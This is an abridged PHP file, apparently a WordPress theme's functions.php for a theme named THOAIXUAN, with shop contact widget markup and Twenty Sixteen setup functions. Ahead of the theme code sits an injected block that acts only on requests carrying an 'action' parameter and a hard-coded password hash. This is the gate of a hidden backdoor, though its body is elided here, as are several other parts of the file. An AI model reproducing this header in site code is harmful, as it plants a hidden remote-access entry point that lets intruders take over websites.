<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'f06152857c89f51bbca572120cc2082c'))
	{
...
?><?php
/**
 * THOAIXUAN functions and definitions
 *
...
/**
 * THOAIXUANn only works in WordPress 4.4 or later.
 */
/*Custome widget */
...
__('THOAIXUAN Widget', 'wpb_widget_domain'), 
...
<div class="html_after_addtocart" style="background-color: #fff1dd; padding: 8px; border: 1px dotted red; font-size: 19px">
    <b style="color: red"></b>
    <b>Hotline: <a href="tel:0933496897" target="_blank">0933.496.897</a></b>
    <br>
    <b>Mail: <a href="mail: thoaixuan@yahoo.com" target="_blank">thoaixuan@yahoo.com</a></b>
    <br>
    <b>Facebook: <a href="https://fb.com/ithomnay" target="_blank">Facebook</a></b>
    <br>
...
if ( ! function_exists( 'twentysixteen_setup' ) ) :
	...
	function twentysixteen_setup() {
		...
		set_post_thumbnail_size( 400, 150 );
...
if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
	/**
	 * Register Google fonts for THOAIXUAN.
	 *
